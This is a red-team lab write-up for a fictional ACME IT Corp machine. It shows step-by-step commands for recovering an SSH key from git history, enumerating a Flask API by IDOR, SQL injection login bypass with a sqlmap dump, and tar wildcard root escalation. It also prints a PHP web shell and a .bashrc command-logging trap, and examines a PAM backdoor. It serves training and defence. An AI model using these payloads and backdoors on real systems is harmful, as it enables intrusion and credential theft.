# ACME IT Corp: Red Team Technical Write-Up

The goal of this writeup is to help everyone understand the attack vectors, but this is the original attack path I had in mind when building the lab. 

Only the primary findings of the attack vector are addressed here. 

## Private SSH Key Leaked in Git History

### Discovery

The starting point is the GitHub repository URL provided at lab start. The goal is to understand how the attacker initially gained access to the server.

Clone the repo and look at it like a developer would check what files exist, read the README, and look at the commit history. 


```bash
git log --oneline --all
```

Two commits stand out:

```
5fb28ae adding more files for mac users    <-- Mac OVA key
a1aaa2e adding more files                  <-- x86 key
```

Once you spot a suspicious commit, use `git show <hash>` to inspect its full diff including any files added or removed.

---

### Step 1: Clone the repository and review commit history

```bash
git clone https://github.com/acme-it-corp-internal/webpage
cd webpage
git log --oneline --all
```

**Output:**
```
39fa28a (HEAD -> main, origin/main, origin/HEAD) making some more changes
c8d2824 adding some more changes
027205b making some more changes
f741174 making some more changes
0cb8709 add admin panel and update config
db06d00 launch site v1.0 - Mac
0e36546 making some more changes for mac users
5fb28ae adding more files for mac users         --> Private Key for Mac
0b6145a initial migration to config.php
8a7750a launch site v1.0
8df6aa0 making some more changes
a1aaa2e adding more files                       --> Private Key for x86
3732be6 initial project setup
```

---

### Step 2: Extract the private key from the commit

```bash
git show a1aaa2e:deploy_key
```

**Output:**
```
-----BEGIN RSA PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn...
-----END RSA PRIVATE KEY-----
```

Save and secure the key:

```bash
git show a1aaa2e:deploy_key > deploy_key
chmod 600 deploy_key
```

---

### Step 3: SSH into the server

```bash
ssh -i deploy_key fongling@192.168.56.21
```

**Output:**
```
fongling@acmecorp-internal:~$
```

---

### Why This Works

Git stores all object history permanently. Removing a file in a commit does not delete it from the repository as it only removes it from the working tree. 

The object remains in `.git/objects/` and is accessible via `git show` or `git cat-file`. This is a common developer mistake that leads to credential exposure.

---

## IDOR on Flask API /api/user/\<id\>


### Overview

The Flask REST API running on port 5000 exposes an unauthenticated endpoint `/api/user/<id>` that returns full employee records including name, role, salary, email, and internal notes. There is no authentication check and any caller can enumerate all employee IDs sequentially. 

The API key found in `config.php` is accepted as a header but never enforced on this endpoint.

---

### Discovery

After landing a shell as fongling, read every file in the git repository and not just the PHP files. `config.php` is the most valuable file in the entire repo because it was committed by mistake and never properly cleaned up.

```bash
cat config.php
```

Two things jump out: the `API_BASE` pointing to port 5000, and the `API_KEY`. Port 5000 would not have shown up on an initial nmap scan because the scan filtering makes results unreliable this is how you find it without a clean port scan.

The next question is whether that endpoint enforces the key. Test it without the key first:

```bash
curl -s http://192.168.56.21:5000/api/health
```

If the health endpoint responds without authentication, iterate the user endpoints the same way.

---

### Step 1: Discover the API from source code review

Reading `config.php` from the git repository reveals the API base URL and key:

```bash
cat config.php
```

**Output:**
```php
define('API_BASE', 'http://192.168.56.21:5000');
define('API_KEY',  'sk-acme-dGhpcyBpcyBhIHRlc3Qga2V5');
```

---

### Step 2: Test for IDOR by iterating user IDs

```bash
for i in $(seq 1 10); do
    echo "-User $i"
    curl -s http://192.168.56.21:5000/api/user/$i
    echo
done
```

**Output:**
```json
--- User 1 ---
{"department":"IT","email":"alice@acmecorp.internal",
 "id":1,"name":"Alice Brown","notes":"Has access to internal ticketing",
 "role":"IT Specialist","salary":72000}
--- User 2 ---
{"department":"Sales","email":"bob@acmecorp.internal",
 "id":2,"name":"Bob Barker","salary":115000}
```

---

### Why This Works

There is no Bearer token validation, session check, or IP restriction on the `/api/user/` route. The API key in the header is read but never validated for this specific endpoint, making sequential enumeration trivial.

---

## SQL Injection on Admin Login Panel

### Overview

The PHP admin panel at `/admin/login.php` passes user-supplied input directly into a MySQL query without prepared statements. This allows authentication bypass and UNION-based data extraction. The vulnerability exists in the username field.

---

### Discovery

The path `/admin/login.php` is not guessable from the homepage. It is disclosed in two places a comment in `config.php` from the git repo, and a link in the site footer labeled "Client Portal".

Once you find the login form, the first thing to test on any login field is whether it is vulnerable to SQL injection. The simplest test is a single quote:

```
# In the username field, type:
'
```

If the page returns a MySQL error or behaves differently than a normal failed login, the field is injectable. On this target the error is suppressed but the behavior changes which is a useful indicator.

From there, the classic auth bypass payload confirms the vulnerability before escalating to a full dump.

---

### Vulnerable Code (from source review)

```php
$query = "SELECT * FROM users WHERE username='$user' AND password=MD5('$pass')";
```

---

### Step 1: Authentication bypass

Navigate to `http://192.168.56.21/admin/login.php` and enter:

```
Username: admin'-- -
Password: anything
```

The resulting query becomes:

```sql
SELECT * FROM users WHERE username='admin'-- - AND password=MD5('anything')
```

The `-- -` comments out the password check entirely, bypassing authentication.

---

### Step 2: UNION-based hash dump via SQLMap

```bash
sqlmap -u "http://192.168.56.21/admin/login.php" \
  --data="username=admin&password=test" \
  --dbms=mysql --dump -T users -D acme_db \
  --batch --level=2
```

**Expected output:**
```
+----+----------+----------------------------------+---------------+
| id | username | password                         | role          |
+----+----------+----------------------------------+---------------+
| 1  | admin    | fd5744ad07d79fd63b2f4f4335e9286a | Administrator |
| 2  | claire   | 412cfc2a4fcbb5cc93455c540124cf17 | Accountant    |
| 3  | fong     | 33605326cb442468af5a4f31fe785455 | Web Dev       |
+----+----------+----------------------------------+---------------+
```

---

## Tar Wildcard Injection (Root Privilege Escalation)

### Overview

A root-owned cron job runs `tar` with a wildcard (`*`) over the `/var/www/html/` directory. Because `fongling` has write access to that directory via `www-data` group membership, an attacker can create files with names that `tar` interprets as command-line flags rather than filenames. This leads to arbitrary command execution as root.

---

### Discovery

After getting a shell as fongling, the standard privilege escalation checklist starts with the obvious:

```bash
sudo -l          # no sudo access
find / -perm -4000 -type f 2>/dev/null   # check SUID binaries
crontab -l       # check fongling's own crontab -- empty
cat /etc/crontab # check system crontab -- reveals the tar job
```

`/etc/crontab` is world-readable and directly shows the tar wildcard job running as root. 

But even if you found nothing there, the next step I: would have done  is running pspy because it reveals processes that run as other users including root cron jobs that do not appear in your own crontab.

The two observations that make this exploitable come from combining `id` output with the pspy 
- `id` shows fongling is in the `www-data` group
- pspy shows root running `tar` with `*` inside `/var/www/html/`
- `ls -la /var/www/html/` confirms the directory is group-writable by `www-data`

All three pieces together are what point at the wildcard injection technique.

---

### Step 1: Discover the cron job with pspy


## Installing pspy on Kali

```bash
export GOPATH=/tmp/go
export PATH=$PATH:/tmp/go/bin
go install github.com/dominicbreuker/pspy@latest 2>&1
file /tmp/go/bin/pspy
```

Transfer pspy from Kali to the target:

```bash
scp -i deploy_key /tmp/go/bin/pspy fongling@192.168.56.21:/tmp/
```

Run pspy on the target and wait for the cron to fire (up to 5 minutes):

```bash
/tmp/pspy 2>&1 | grep -E "tar|backup|UID=0"
```

**Output:**
```
2026/04/16 12:45:01 CMD: UID=0  | /bin/sh -c cd /var/www/html && tar czf /var/backups/web/backup.tar.gz *
2026/04/16 12:45:01 CMD: UID=0  | tar czf /var/backups/web/backup.tar.gz admin assets backups config.php index.php uploads
2026/04/16 12:45:01 CMD: UID=1004 | /bin/bash /opt/acme/scripts/backup_check.sh
2026/04/16 12:45:01 CMD: UID=1004 | logger ACME backup check OK - 3 files found
```

---

### Step 2: Verify write access to the webroot

```bash
id
```
```
uid=1001(fongling) gid=1001(fongling) groups=1001(fongling),33(www-data),999(docker)
```

```bash
touch /var/www/html/test && echo 'writable' && rm /var/www/html/test
```
```
writable
```

---

### Step 3: Plant the exploit files

```bash
cd /var/www/html

# Create the payload script
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' > shell.sh
chmod +x shell.sh

# Create files named as tar flags
touch './--checkpoint=1'
touch './--checkpoint-action=exec=sh shell.sh'
```

Verify the files are in place:

```bash
ls -la | grep -E 'checkpoint|shell'
```
```
-rw-rw-r-- 1 fongling fongling     0 Apr 16 12:47 --checkpoint=1
-rw-rw-r-- 1 fongling fongling     0 Apr 16 12:47 --checkpoint-action=exec=sh shell.sh
-rwxrwxr-x 1 fongling fongling    53 Apr 16 12:47 shell.sh
```

---

### Step 4: Wait for cron to fire (up to 5 minutes)

```bash
watch -n 5 ls -la /tmp/rootbash
```

**Output when cron fires:**
```
-rwsr-sr-x 1 root root 1446024 Apr 16 12:55 /tmp/rootbash
```

---

### Step 5: Execute the SUID bash for root shell

```bash
/tmp/rootbash -p
```
```
rootbash-5.2# whoami
root
```

---

### Why This Works

GNU tar processes filenames before flags during wildcard expansion. When the shell expands the `*` in `/var/www/html/*`, it includes every file in the directory including files whose names begin with `--`. Tar interprets `--checkpoint=1` as a flag that fires a callback every 1 record, and `--checkpoint-action=exec=sh shell.sh` as the command to run at each checkpoint. Because tar runs as root, `shell.sh` executes with root privileges.

---

## PAM Backdoor (Master Password)

### Overview

A malicious PAM module (`pam_acme_auth.so`) has been installed and configured in `/etc/pam.d/common-auth`. This module accepts a hardcoded master password `r00tg0d2026` for any user account, bypassing normal authentication entirely. The module also logs all failed password attempts to `/tmp/.cache/.auth_harvest`.

---

### Discovery

PAM is rarely checked during red team engagements which is exactly why attackers use it for persistence. The discovery path here is enumeration of authentication-related config files something linpeas does automatically, or that a thorough manual enumeration covers.

After getting root via tar wildcard or another path, and look at the authentication stack:

```bash
cat /etc/pam.d/common-auth
```

Any module listed in this file that is not a standard Ubuntu PAM module is immediately suspicious. The standard modules are `pam_unix.so`, `pam_deny.so`, `pam_permit.so`, and `pam_cap.so`. 

The presence of `pam_acme_auth.so` with the `sufficient` control flag is the indicator of compromise.

Cross-reference it against the known module list:

```bash
dpkg -L libpam-runtime libpam-modules | grep "\.so"
```

`pam_acme_auth.so` will not appear in that list because it was not installed through the package manager it was manually dropped by the attacker.

---

### Step 1: Discover the PAM misconfiguration

```bash
cat /etc/pam.d/common-auth
```

**Output:**
```
auth    sufficient                      pam_acme_auth.so
auth    [success=1 default=ignore]      pam_unix.so nullok
auth    requisite                       pam_deny.so
auth    required                        pam_permit.so
auth    optional                        pam_cap.so
```

The `pam_acme_auth.so` module is not a standard system module. Verify by listing modules:

```bash
ls /usr/lib/x86_64-linux-gnu/security/ | grep acme
```
```
pam_acme_auth.so    <-- non-standard module
```

Check for timestomping the Birth timestamp reveals when the file was actually created despite the Modify time being faked:

```bash
stat /usr/lib/x86_64-linux-gnu/security/pam_acme_auth.so
stat /usr/lib/x86_64-linux-gnu/security/pam_unix.so
```
```
  File: /usr/lib/x86_64-linux-gnu/security/pam_acme_auth.so
  Modify: 2025-09-15 12:37:15.000000000 +0000
  Change: 2026-04-04 18:35:28.393911914 +0000
   Birth: 2026-04-04 14:04:46.256274066 +0000

  File: /usr/lib/x86_64-linux-gnu/security/pam_unix.so
  Modify: 2025-09-15 12:37:15.000000000 +0000
  Change: 2026-04-03 00:04:54.855070106 +0000
   Birth: 2026-04-03 00:04:54.855070106 +0000
```

The Modify timestamps match (timestomped to look identical) but the Birth timestamps differ `pam_acme_auth.so` was created on Apr 4 2026, well after system installation.

---


### Step 2: 

```bash
strings /usr/lib/x86_64-linux-gnu/security/pam_acme_auth.so
```

**Output:**
```
mkdir -p /tmp/.cache && chmod 777 /tmp/.cache
/tmp/.cache/.auth_harvest
%s user=%s pass=%s
Password: 
r00tg0d2026
```

---

### Step 3: Test the master password

```bash
su - alicebrown
# Password: r00tg0d2026
```
```
alicebrown@acmecorp-internal:~$
```

Works on any account:

```bash
ssh mallorymartinez@192.168.56.21
# Password: r00tg0d2026
```
```
mallorymartinez@acmecorp-internal:~$
```

---

### Why This Works

PAM (Pluggable Authentication Modules) is the authentication framework for all logins on Linux. The `sufficient` keyword means if the module returns success, PAM immediately grants access without checking any further modules that includes `pam_unix.so` which handles normal password validation. 

The module uses the PAM conversation function to prompt for a password and compares it against the hardcoded string before `pam_unix.so` ever sees the input.

---

## SUID Bit on /usr/local/bin/svc_check


### Overview

A non-standard SUID binary exists at `/usr/local/bin/svc_check`. The binary is a copy of `/bin/bash` with the SUID bit set by root. By passing the `-p` flag, any user can execute it and retain the root effective UID that the SUID bit grants.

---

### Discovery

binaries is a standard enumeration step but: knowing which ones are suspicious requires understanding what is normal. Running the find command returns both legitimate system binaries and attacker-planted ones:

```bash
find / -perm -u=s -type f 2>/dev/null
```

The key is knowing where legitimate SUID binaries live. Standard Ubuntu SUID binaries are almost exclusively under `/usr/bin/` or `/usr/lib/`. A binary in `/usr/local/bin/` with a SUID bit is immediately non-standard and that directory is for locally installed software and should never contain SUID binaries on a web server.

The name `svc_check` is designed to look like a service monitoring binary. The investigation steps: are to identify what it actually is before attempting to exploit it.

---

### Step 1: Find non-standard SUID binaries

```bash
find / -perm -u=s -type f 2>/dev/null
```
```
/usr/local/bin/svc_check    <-- non-standard, investigate this
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/su
/usr/bin/chfn
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/fusermount3
/usr/bin/gpasswd
/usr/bin/umount
/usr/lib/openssh/ssh-keysign
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

---

### Step 2: Identify the binary

```bash
file /usr/local/bin/svc_check
```
```
ELF 64-bit LSB pie executable, x86-64, dynamically linked
```

```bash
md5sum /usr/local/bin/svc_check /bin/bash
```
```
303330f9f1b6617b3b533e4dcfe1faf0  /usr/local/bin/svc_check
303330f9f1b6617b3b533e4dcfe1faf0  /bin/bash
# Identical hashes -- svc_check is a copy of bash
```

---

### Step 3: Reference GTFOBins and exploit

Search [GTFOBins](https://gtfobins.org/gtfobins/bash/) for `bash` under the SUID category.

The `-p` flag tells bash not to drop the effective UID set by the SUID bit:

```bash
/usr/local/bin/svc_check -p
```
```
svc_check-5.2# whoami
root
```

---

### Why the -p Flag Is Required

By default, bash detects when it is running with a different effective UID than real UID (the SUID case) and drops the elevated effective UID as a security measure. The `-p` flag (privileged mode) disables this behavior, preserving the effective UID of 0 (root) that was set by the SUID bit. Without `-p`, the shell opens but `id` shows the normal user UID a common point of confusion.

---

## Hidden Web Shell


### Overview

A PHP web shell exists at `/var/www/html/uploads/cmd.php`. The file is hidden from standard directory listings by a kernel rootkit hooking `getdents64`, but remains accessible via direct path. 


---

### Discovery

The uploads directory path comes from two sources: source code review of the PHP files showing directory references, and the admin dashboard which exposes file paths through its export functionality.

Once you know the path, the reason to check it directly rather than relying on `ls` comes from a broader lesson about rootkits: if `lsmod` shows a non-standard kernel module, you cannot trust any userspace tool that reads directory contents. `ls`, `find`, and `tree` all call `getdents64` through the kernel and will return whatever the rootkit decides to show.

The reliable ways to check for hidden files when a rootkit is suspected:

```bash
# Direct file access by known path
cat /var/www/html/uploads/cmd.php

# Check inode count -- higher than visible files means hidden entries
ls -lai /var/www/html/uploads/

# Check /proc for open file descriptors pointing to the directory
ls /proc/*/fd 2>/dev/null | xargs ls -la 2>/dev/null | grep uploads
```

---

### Step 1: Discover the hidden file

Standard `ls` shows nothing:

```bash
ls -la /var/www/html/uploads/
```
```
total 12
drwxr-xr-x 2 www-data www-data 4096 Apr  3 18:52 .
drwxr-xr-x 6 www-data www-data 4096 Apr  3 22:08 ..
-rwxr-xr-x 1 www-data www-data   52 Apr  3 17:43 index.php
```

But direct path access still works the rootkit only intercepts directory listing calls:

```bash
cat /var/www/html/uploads/cmd.php
```
```php
<?php
// system diagnostics - do not delete
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    echo '<pre>' . shell_exec($cmd) . '</pre>';
}
?>
```

---

### Step 2: Detect the rootkit hiding the file

```bash
lsmod | grep -v '^Module'
```
```
rootkit    12288  0    <-- non-standard LKM
```

The `rootkit` module is not a standard kernel module. It hooks the `getdents64` syscall to filter out `cmd.php` from directory listing results.

---

### Step 3: Test the web shell

```bash
curl 'http://192.168.56.21/uploads/cmd.php?cmd=id'
```
```html
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)</pre>
```

---

## Credential Harvest Files in /tmp/.cache/


### Overview

Two hidden files in `/tmp/.cache/` capture credentials from active user sessions. The `.auth_harvest` file is written by the malicious PAM module and logs every failed authentication attempt including plaintext passwords. 

The `.session_log` file is written by a malicious `DEBUG` trap injected into `fongling` and `mallory`'s `.bashrc` files, recording every command executed in their shells.

---

### Discovery

Hidden files and directories in `/tmp/` are a common attacker technique. After getting any shell on the system, `/tmp/` is always worth a thorough look:

```bash
ls -la /tmp/
```

The `.cache` directory stands out it is world-writable (`drwxrwxrwx`) which is unusual, and it is owned by root which is suspicious for a cache directory that appears to have been created recently.

Another indicator


```bash
sudo -l
[sudo] password for fongling: 
chmod: changing permissions of '/tmp/.cache': Operation not permitted
[sudo] password for fongling: 
```


The `.session_log` file leads directly to the `.bashrc` backdoor. Seeing fongling's commands logged there means something in fongling's shell environment is capturing every command. The `trap` and `PROMPT_COMMAND` variables in `.bashrc` are the first place to look:

```bash
cat /home/fongling/.bashrc
cat /home/mallorymartinez/.bashrc
```

Compare them against a clean Ubuntu `.bashrc` any functions or trap statements not present in the default file were added by the attacker.

---

### Step 1: Discover the hidden cache directory

```bash
ls -la /tmp/
```
```
drwxrwxrwt  9 root root 4096 Apr  4 18:33 .
drwxrwxr-x  2 root root 4096 Apr  4 14:14 .cache    <-- hidden directory
```

```bash
ls -la /tmp/.cache/
```
```
-rw-r--r-- 1 root     root      512 Apr  4 18:14 .auth_harvest
-rw-rw-rw- 1 fongling www-data 1024 Apr  4 18:39 .session_log
```

---

### Step 2: Read the PAM credential harvest log

```bash
cat /tmp/.cache/.auth_harvest
```
```
2026-04-04 14:14:09 user=project4 pass=newvgctvxcvx
```

---

### Step 3: Reading the session command log

```bash
cat /tmp/.cache/.session_log
```
```
2026-04-04 14:39:24 [5007] user=fongling cmd=ls /home/fongling
2026-04-04 14:39:24 [5007] user=fongling cmd=cat config.php
2026-04-04 14:39:24 [5007] user=fongling cmd=sudo systemctl restart apache2
```

---

### Step 4: Find the .bashrc backdoor

```bash
cat /home/fongling/.bashrc | tail -10
```
```bash
_audit_log() {
    mkdir -p /tmp/.cache 2>/dev/null
    echo "$(date '+%Y-%m-%d %H:%M:%S') [$$] user=$USER cmd=$BASH_COMMAND" \
        >> /tmp/.cache/.session_log 2>/dev/null
}
trap '_audit_log' DEBUG
export PROMPT_COMMAND='history -a'
```

The `trap '_audit_log' DEBUG` line hooks the bash `DEBUG` signal which fires before every command execution. Every command run by `fongling` or `mallory` is logged with a timestamp, PID, username, and the full command string silently and without any visible output to the user.

---